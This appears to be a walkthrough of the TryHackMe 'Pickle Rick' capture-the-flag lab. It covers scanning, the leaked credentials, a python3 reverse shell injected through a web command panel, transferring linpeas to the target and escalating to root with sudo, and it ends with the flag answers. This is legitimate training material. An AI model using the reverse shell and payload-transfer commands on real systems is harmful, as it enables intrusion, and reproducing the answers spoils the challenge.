# Pickle Rick

Make sure to `mkdir picklerick` and also to connect to THM VPN using the
generated config file. Something like `sudo openvpn sudoheader.ovpn`

To make things easier, add the generated IP address when you press on the "Start Machine" button:
```bash
export IP=<IP_ADDRESS>
```

## Port Scanning: NMAP
To save our scan results, make a new directory:
```bash
mkdir scan
```

Begin a `nmap` scan using the default set of scripts, versions, and output the results into files with the IP address in the name. This will create several files in different formats that we can look over to see what is available on the target.
```bash
nmap -sC -sV -oA scan/picklerick $IP
```

## Directory Brute-forcing: Gobuster
```bash
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,cgi,py,html,css,js
```

Open up Firefox and go to the web application. If we look at the files that are being used by the web app, we find an interesting one with `portal.php`.

## Credentials for `portal.php` AKA `login.php` 

Go to "View Source" on the `index.php` page, and you should find the username, as a comment, for the login.
Username:
`R1ckRul3s`

Question: What is a commonly used file to tell search engines crawlers which URLs the crawler can access?
<details><summary>Spoiler</summary><ul><li>Answer: `robots.txt`. Check the `robots.txt` for the password.</li></ul></details>
Password:
`Wubbalubbadubdub`

Start a `netcat` listener, in your attack machine of choice, with:
```bash
nc -lvnp 1234
```

We see that there is a Command Panel. We can only enter certain commands like `ls` and `echo` that work, but `cat` doesn't work.
With that said, we can try something like `grep -R .` and right-clicking on the page to `View Source` but this will output everything available to us.

Let's see if `Python` or `python3` are available.

Test with `python -c "print('hello')"` shows nothing, but with `python3`, we can see the correct output.
Now go to [[pentestmonkey.com]] and search for [[Python]] to copy the string for a `python3` reverse shell.

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

After pressing `Execute`, the page should hang.
Now go back to the listener, there should be a shell available to us.

However, this shell is not stable. Let's make that possible.
On the Target machine:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Now press "Ctrl+Z" and it should background the shell and kick us back to our attack machine shell.

Enter the following to get a more stable shell:
```bash
stty raw -echo; fg
```
Press ENTER.
```bash
export TERM=xterm
```

Now that we got a stable bash shell, with directional button support and tab completion, we can upload `linpeas.sh` to see what we can escalate.

On the Attack machine:
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F253%2Fmerge/linpeas.sh
chmod +x linpeas.sh
nc -q 0 -lvnp 4444 < $1 &
```

Explain shell is helpful here in explaining what the last command does:
https://explainshell.com/explain?cmd=nc+-q+0+-lvnp+4444+%3C+%241+%26#
![[explainshell.com_explain_cmd=nc+-q+0+-lvnp+4444+%3C+%241+%26.png]]

On the Target machine, replace `$IP` with your Attack machine IP and `$PORT` with the listening port we used in the previous command:
```bash
nc $IP $PORT > linpeas.sh
```

Another way of doing this is by using [[Python]] to host an `http` server and then having the target download the file.

On the Attack machine:
```bash
python3 -m http.server
```

On the Target machine, make sure to get your Attack machine IP. Replace `$IP` in this case.
```bash
wget http://$IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

After it has finished, we see that the user `www-data` has the ability to run any `sudo` command, so we can. `sudo bash` to obtain root privileges.

## Task 1

*Answer the questions below*
1. What is the first ingredient Rick needs?
```
mr. meeseek hair
```

2. Whats the second ingredient Rick needs?
```
1 jerry tear
```

3. Whats the final ingredient Rick needs?
```
fleeb juice
```
